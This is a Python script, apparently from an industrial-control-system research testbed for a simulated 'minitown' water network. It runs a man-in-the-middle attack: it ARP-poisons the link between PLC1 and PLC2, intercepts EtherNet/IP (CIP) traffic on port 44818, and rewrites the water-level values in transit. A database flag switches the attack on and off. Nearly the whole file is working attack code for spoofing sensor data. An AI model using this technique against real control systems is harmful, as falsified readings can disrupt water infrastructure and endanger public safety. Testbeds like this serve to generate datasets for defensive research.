import cip
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from scapy.all import Ether
from scapy.all import *
import sys
import os
import time

from ips import minitown_ips

import sqlite3

import networker
import convertions

conn = sqlite3.connect('../../ICS_topologies/minitown_topology_dataset_generation/minitown_db.sqlite')
cursor = conn.cursor()

enip_port = 44818
sniffed_packet = []

sniff_counter = 0

stop_attack = False

nfqueue = NetfilterQueue()

track_threshold = 0.5


def finish():
    networker.setdown_netfilterqueue(enip_port)
    sys.exit(0)


def injection(raw):
    print ("In injection-----------")
    float_value = convertions.translate_load_to_float(raw)
    fake_value = 4.3 + float_value
    cursor.execute("UPDATE minitown SET value = 3 WHERE name = 'ATT_2'")
    conn.commit()
    pay = convertions.translate_float_to_load(fake_value, raw[0], raw[1])
    return pay

def capture(packet):
    pkt = IP(packet.get_payload())
    if len(pkt) == 102:
        raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
        pay = injection(raw)
        pkt[Raw].load = pay  # This is an IP packet
        del pkt[TCP].chksum  # Needed to recalculate the checksum
        packet.set_payload(str(pkt))
    packet.accept()

    rows = cursor.execute("SELECT value FROM minitown WHERE name = 'ATT_1'").fetchall()
    conn.commit()
    attack = int(rows[0][0])

    if attack == 0:
        print('[*] Stopping MiTM attack on PLC2')

        global stop_attack
        stop_attack = True

    if stop_attack:
        setdown()

def setup():
    networker.start_forwarding()

def setdown():
    networker.setdown_netfilterqueue(enip_port)
    nfqueue.unbind()
    print("[*] Finished MiTM Attack on PLC2")
    cursor.execute("UPDATE minitown SET value = 0 WHERE name = 'ATT_1'")
    conn.commit()

def launch_mitm():
    networker.setup_netfilterqueue(enip_port)

    targetip = minitown_ips['plc2']
    sourceip = minitown_ips['plc1']

    networker.launch_arp_poison(sourceip, targetip)
    nfqueue.bind(0, capture)
    try:
        print("[*] Starting water level spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        print("[*] Interrupted attack process")
        finish()
    return 0



if __name__ == '__main__':
    setup()
    print('[] Preparing MiTM PLC2')

    while True:
        rows = cursor.execute("SELECT value FROM minitown WHERE name = 'ATT_1'").fetchall()
        conn.commit()
        attack = int(rows[0][0])

        if attack == 3:
            print('[*] Launching Mitm')
            launch_mitm()
        else:
            print('[] Waiting for replay phase on SCADA')
            time.sleep(1)